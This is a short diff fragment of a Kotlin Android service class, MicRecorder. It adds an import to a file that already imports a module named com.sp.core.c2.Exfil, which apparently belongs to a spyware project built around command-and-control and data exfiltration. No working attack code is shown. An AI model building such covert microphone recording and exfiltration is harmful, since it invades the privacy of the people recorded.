@@ -10,6 +10,7 @@ import android.os.IBinder
 import android.os.Looper
 import androidx.core.app.NotificationCompat
 import com.sp.core.c2.Exfil
+import com.sp.core.util.Fgs
 import java.io.File
 
 class MicRecorder : Service() {
